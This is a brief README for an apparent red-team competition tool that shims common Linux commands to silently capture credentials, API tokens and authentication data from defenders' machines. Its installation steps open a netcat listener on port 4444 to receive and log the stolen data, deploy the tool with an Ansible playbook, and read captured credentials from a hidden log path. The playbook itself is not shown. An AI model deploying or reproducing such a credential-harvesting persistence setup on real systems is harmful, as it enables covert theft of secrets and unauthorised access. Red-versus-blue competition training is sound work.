Tyler Gardner - Red team tool 

This tool a stealth persistence tool designed to silently capture credentials, API tokens, and authentication metadata from blue team machines by shimming common linux commands.

Installation:
On jumpbox:
sudo apt update
sudo apt install ansible netcat-openbsd -y
mkdir -p ~/redteam-tool/ansible
cd ~/redteam-tool/ansible
nano deploy.yml
nano inventory.ini
nc -l -p 4444 -k | tee -a logs_$(date +%Y%m%d_%H%M%S).txt (Sets up netcat live viewing and moves it to a log as well)
cd ~/redteam-tool/ansible
ansible-playbook -i inventory_competition deploy.yml

After its ran then you can ssh and view logs on the machines themselves
sudo cat /var/log/.pam.d/auth.log